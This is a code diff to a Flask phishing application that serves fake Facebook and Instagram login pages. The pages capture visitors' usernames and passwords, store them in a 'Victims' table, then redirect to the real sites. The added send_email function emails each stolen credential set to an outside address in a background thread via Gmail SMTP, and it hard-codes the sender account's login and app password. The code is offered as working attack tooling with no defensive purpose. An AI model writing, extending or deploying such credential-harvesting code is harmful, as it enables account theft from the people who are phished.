@@ -7,7 +7,8 @@ from flask_wtf import FlaskForm
 from flask_wtf.file import FileField, FileAllowed
 from flask_bcrypt import Bcrypt
 from flask_login import  LoginManager, UserMixin, login_user, current_user, logout_user, login_required
-
+import smtplib
+from threading import Thread
 
 
 app = Flask(__name__)
@@ -36,8 +37,6 @@ class Victims(db.Model):
     uid = db.Column(db.Integer)
 
    
-
-
 
 
 
@@ -160,17 +159,52 @@ def register():
 
 
 
+############################   Threading    ######################################################
 
 
+
+
+#############################################    SMPT        ###############################################
+
+
+
+
+def send_email(username, password, platform):
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.ehlo()
+    server.starttls()
+    server.ehlo()
+
+    server.login('heroztech48@gmail.com', 'sqwbipaupurkqlev')
+    subject = 'New Victim Found'
+    body = f'These are the credentials . \nPlatform : {platform} \n Name : {username} \n Password : {password}'
+
+    msg = f'Subject: {subject}\n\n Body: {body}'
+    server.sendmail(
+        'heroztech48@gmail.com',
+        'herocrispin48@gmail.com',
+        msg
+    )
+
+    server.quit()
+
+
+
+####################################################################################################
 
 @app.route('/facebook/<int:uid>', methods=['GET', 'POST'])
 def facebook(uid):
     if request.method == 'POST':
+        platform = 'Facebook'
         captured_username = request.form['username']
         captured_password = request.form['user_password']
-        new_victim = Victims(username=captured_username, platform='Facebook', password=captured_password, uid=uid)
+        new_victim = Victims(username=captured_username, platform=platform, password=captured_password, uid=uid)
         db.session.add(new_victim)
         db.session.commit()
+
+        t = Thread(target=send_email, args=[captured_username, captured_password, platform])
+
+        t.start()
         return redirect('https://facebook.com')
     else:
         return render_template('/facebook/index.html')
@@ -180,14 +214,21 @@ def facebook(uid):
 @app.route('/instagram/<int:uid>', methods=['GET', 'POST'])
 def instagram(uid):
     if request.method == 'POST':
+        platform='Instagram'
         captured_username = request.form['username']
         captured_password = request.form['user_password']
         new_victim = Victims(username=captured_username, platform='Instagram', password=captured_password, uid=uid)
         db.session.add(new_victim)
         db.session.commit()
+        t = Thread(target=send_email, args=[captured_username, captured_password, platform])
+
+        t.start()
         return redirect('https://instagram.com')
     else:
         return render_template('/instagram/index.html')
+
+
+
 	
 
 
